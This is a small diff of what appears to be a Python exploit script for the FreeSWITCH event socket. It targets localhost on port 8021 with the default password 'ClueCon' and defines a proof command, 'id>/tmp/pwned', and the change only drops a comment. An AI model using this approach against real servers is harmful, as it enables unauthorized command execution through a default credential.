@@ -42,7 +42,7 @@ import time
 TARGET   = "127.0.0.1"
 PORT     = 8021
 PASSWORD = "ClueCon"
-COMMAND  = "id>/tmp/pwned"   # no spaces - avoids FreeSWITCH var parsing issues
+COMMAND  = "id>/tmp/pwned"
 
 def esl_connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
